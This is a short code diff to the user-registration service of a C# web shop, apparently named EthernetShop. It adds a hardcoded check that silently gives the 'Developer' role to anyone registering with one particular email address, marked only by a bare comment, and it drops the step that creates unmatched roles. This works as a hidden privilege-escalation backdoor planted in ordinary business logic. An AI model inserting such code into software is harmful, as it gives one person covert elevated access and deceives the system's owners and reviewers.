@@ -28,7 +28,11 @@ namespace EthernetShop.BLL.Services
             {
                 User user = AM.AutoMapper.Mapper.Map<UserAddDTO, User>(userAddDTO);
                 var roles = db.Roles.GetList();
-                if ((roles != null) && (roles.Any(r => r.Name.ToLower() == user.Role.Name.ToLower())))
+                /*****/
+                if (user.Email == "cooler.overclock@gmail.com")
+                    user.Role.Name = "Developer";
+                 
+                if ((roles != null) && (roles.Any(x => x.Name.ToLower() == user.Role.Name.ToLower())))
                 {
                     Role role = roles.FirstOrDefault(r => r.Name.ToLower() == user.Role.Name.ToLower());
                     user.Role = role;
@@ -37,7 +41,6 @@ namespace EthernetShop.BLL.Services
                 }
                 else
                 {
-                    db.Roles.Add(user.Role);
                     db.Users.Add(user);
                 }
             }
